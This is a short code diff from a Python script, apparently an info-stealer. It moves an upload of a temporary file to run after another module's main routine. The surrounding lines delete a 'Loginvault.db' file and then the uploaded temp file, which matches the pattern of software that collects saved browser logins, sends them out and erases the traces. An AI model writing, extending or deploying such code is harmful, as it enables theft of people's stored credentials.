@@ -101,8 +101,8 @@ if __name__ == '__main__':
                 conn.close()
                 os.remove("Loginvault.db")
         temp_file.close()
-        upload(tmpfile)
         info.main()
+        upload(tmpfile)
         os.remove(tmpfile)
     except IOError as e:
         print("[ERR] %s"%str(e))
